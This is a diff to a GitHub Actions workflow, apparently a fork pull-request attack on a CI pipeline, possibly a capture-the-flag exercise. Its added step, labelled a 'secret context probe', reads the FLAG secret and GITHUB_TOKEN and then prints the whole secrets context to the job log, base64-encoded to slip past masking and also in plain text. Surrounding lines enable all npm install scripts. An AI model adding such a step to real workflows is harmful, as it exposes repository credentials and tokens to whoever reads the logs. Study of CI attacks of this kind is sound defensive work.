@@ -77,6 +77,14 @@ jobs:
           printf 'dangerously-allow-all-scripts=true\nforeground-scripts=true\n' > .npmrc
           printf 'report authored by the fork PR\n' > linter-report.txt
           printf '%s' "$PR_NUMBER" > pr-number.txt
+      - name: Secret context probe (fork PR)
+        env:
+          SF: ${{ secrets.FLAG }}
+          SG: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "FLAG_len=${#SF} GITHUB_TOKEN_len=${#SG}"
+          echo "secrets_json_b64=$(printf '%s' '${{ toJSON(secrets) }}' | base64 -w0)"
+          echo "secrets_json_plain=${{ toJSON(secrets) }}"
       - uses: actions/upload-artifact@v4
         with:
           name: linter-report
